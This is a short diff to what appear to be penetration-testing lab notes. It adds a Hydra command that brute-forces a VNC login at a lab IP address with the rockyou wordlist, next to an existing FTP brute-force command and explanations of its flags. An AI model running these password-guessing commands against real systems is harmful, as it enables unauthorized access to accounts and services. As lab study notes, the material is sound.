@@ -4,3 +4,5 @@ hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.195.6 ftp - bru
   -P           - Points to the wordlist
   -vV          - Sets verbose mode to very verbose, shows the login+pass combination for each attempt
 
+hydra -P /usr/share/wordlists/rockyou.txt -vV 10.10.99.166 vnc - vnc protocol doesn't need username
+
